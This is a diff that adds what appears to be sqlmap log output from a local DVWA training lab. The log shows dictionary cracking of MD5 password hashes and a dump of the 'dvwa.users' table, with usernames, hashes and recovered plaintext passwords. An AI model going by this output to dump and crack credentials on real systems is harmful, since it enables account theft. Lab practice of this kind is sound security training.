@@ -1,0 +1,70 @@
+[12:59:39] [INFO] current status: zwezd... |
+[12:59:39] [INFO] current status: zx091... |
+[12:59:39] [INFO] current status: zxc12... /
+[12:59:39] [INFO] current status: zxcv8... -
+[12:59:39] [INFO] current status: zxcvb... \
+[12:59:39] [INFO] current status: zxt69... |
+[12:59:39] [INFO] current status: zygap... |
+[12:59:39] [INFO] current status: zyku1... /
+[12:59:39] [INFO] current status: zyraf... -
+[12:59:39] [INFO] current status: zz0eD... \
+[12:59:39] [INFO] current status: zzk21... |
+[12:59:39] [INFO] current status: zzz1p... |
+[12:59:39] [INFO] current status: |]CH-... /
+[12:59:39] [INFO] current status: ~~~  ... -
+[12:59:42] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
+
+[12:59:47] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
+
+[12:59:56] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
+
+[13:00:00] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
+
+[13:00:08] [INFO] current status: zorqh... |
+[13:00:08] [INFO] current status: zosoi... |
+[13:00:08] [INFO] current status: zowee... /
+[13:00:08] [INFO] current status: zppto... -
+[13:00:08] [INFO] current status: zr6ai... \
+[13:00:08] [INFO] current status: zs8z6... |
+[13:00:08] [INFO] current status: zsold... |
+[13:00:08] [INFO] current status: ztkmq... /
+[13:00:08] [INFO] current status: zubil... -
+[13:00:08] [INFO] current status: zudxw... \
+[13:00:08] [INFO] current status: zuide... |
+[13:00:08] [INFO] current status: zulio... |
+[13:00:08] [INFO] current status: zumme... /
+[13:00:08] [INFO] current status: zura ... -
+[13:00:08] [INFO] current status: zuus ... \
+[13:00:08] [INFO] current status: zvai ... |
+[13:00:08] [INFO] current status: zwart... |
+[13:00:08] [INFO] current status: zwfzf... /
+[13:00:08] [INFO] current status: zx120... -
+[13:00:08] [INFO] current status: zxc12... \
+[13:00:08] [INFO] current status: zxcva... |
+[13:00:08] [INFO] current status: zxcvb... |
+[13:00:08] [INFO] current status: zxtes... /
+[13:00:08] [INFO] current status: zygit... -
+[13:00:08] [INFO] current status: zylal... \
+[13:00:08] [INFO] current status: zyrap... |
+[13:00:08] [INFO] current status: zz102... |
+[13:00:08] [INFO] current status: zzl21... /
+[13:00:08] [INFO] current status: zzz4x... -
+[13:00:08] [INFO] current status: |nt3g... \
+[13:00:08] [INFO] current status: ~~~~~... |Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2026-10-17 07:27:38 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2026-10-17 07:27:38 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2026-10-17 07:27:38 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2026-10-17 07:27:38 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-10-17 07:27:38 | 0            |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+
+[13:00:08] [INFO] table 'dvwa.users' dumped to CSV file '/private/tmp/sqlmap-out/127.0.0.1/dump/dvwa/users.csv'
+[13:00:08] [INFO] fetched data logged to text files under '/private/tmp/sqlmap-out/127.0.0.1'
+
+[*] ending @ 13:00:08 /2026-10-17/
+
